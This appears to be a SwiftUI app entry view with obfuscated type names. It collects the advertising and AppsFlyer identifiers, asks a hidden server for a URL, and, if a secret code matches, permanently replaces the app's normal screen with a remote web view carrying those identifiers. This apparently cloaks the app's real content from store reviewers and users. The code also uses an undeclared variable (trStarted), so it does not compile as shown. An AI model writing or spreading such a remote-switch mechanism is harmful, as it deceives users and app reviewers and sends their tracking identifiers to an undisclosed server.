import SwiftUI
import AdSupport
import AppTrackingTransparency
import AppsFlyerLib

struct Ogiurwhgjehgr: View {
    @State private var webViewURL: URL? = UserDefaults.standard.url(forKey: "savedWebViewURL")
    @State private var isLoading: Bool = true
    @State private var idfa: String = ""
    @State private var appsflyerId: String = ""
    @State private var trackingStatusReceived: Bool = false
    @State private var conversionParams: String? = nil

    var body: some View {
        Group {
            if let url = webViewURL {
                Uwruyeghehjgdh(url: url) { finalURL in
                   
                    if UserDefaults.standard.url(forKey: "savedWebViewURL") == nil {
                        UserDefaults.standard.set(finalURL, forKey: "savedWebViewURL")
                    }
                }
            } else if !trackingStatusReceived {
                Color.black
                    .ignoresSafeArea()
            } else if isLoading {
                Color.black
                    .ignoresSafeArea()
            } else {
                ContentView()
                    .preferredColorScheme(.light)
            }
        }
        .onAppear {
            if webViewURL == nil {
                DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                    prepareTracking()
                }
            }
            
            
        }
    }

    private func prepareTracking() {
        ATTrackingManager.requestTrackingAuthorization { status in
            DispatchQueue.main.async {
                switch status {
                case .authorized:
                    idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                default:
                    idfa = "00000000-0000-0000-0000-000000000000"
                }
                appsflyerId = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
                trackingStatusReceived = true

                Prejhghjdfgjd.shared.startTracking { params in
                    conversionParams = params
                    fetchWebsiteData()
                    trStarted = true
                }
                
                DispatchQueue.main.asyncAfter(deadline: .now() + 7) {
                    if !trStarted {
                        print("Fallback: forcing")
                        fetchWebsiteData()
                    }
                }
            }
        }
    }

    private func fetchWebsiteData() {
        guard let url = URL(string: ertjrtj) else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            return
        }
        
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 10.0
        config.timeoutIntervalForResource = 15.0
        
        let session = URLSession(configuration: config)
        
        let timeoutTimer = DispatchWorkItem {
            DispatchQueue.main.async {
                if self.isLoading {
                    print("Timeout: fetchWebsiteData took too long")
                    self.isLoading = false
                }
            }
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 20, execute: timeoutTimer)
        
        session.dataTask(with: url) { data, response, error in
            DispatchQueue.main.async {
                timeoutTimer.cancel()
                
                defer { self.isLoading = false }
                
                if let error = error {
                    print("Network error: \(error.localizedDescription)")
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    guard 200...299 ~= httpResponse.statusCode else {
                        print("HTTP error: \(httpResponse.statusCode)")
                        return
                    }
                }
                
                guard let data = data,
                      let text = String(data: data, encoding: .utf8) else {
                    print("Invalid data received")
                    return
                }
                
                if text.contains(aCode) {
                    var finalURL = text + "?idfa=\(self.idfa)&gaid=\(self.appsflyerId)"
                    if let params = self.conversionParams {
                        finalURL += params
                    }
                    if let url = URL(string: finalURL) {
                        self.webViewURL = url
                    } else {
                        print("Failed to create URL from: \(finalURL)")
                    }
                } else {
                    print("Response doesn't contain required code")
                }
            }
        }.resume()
    }
} 
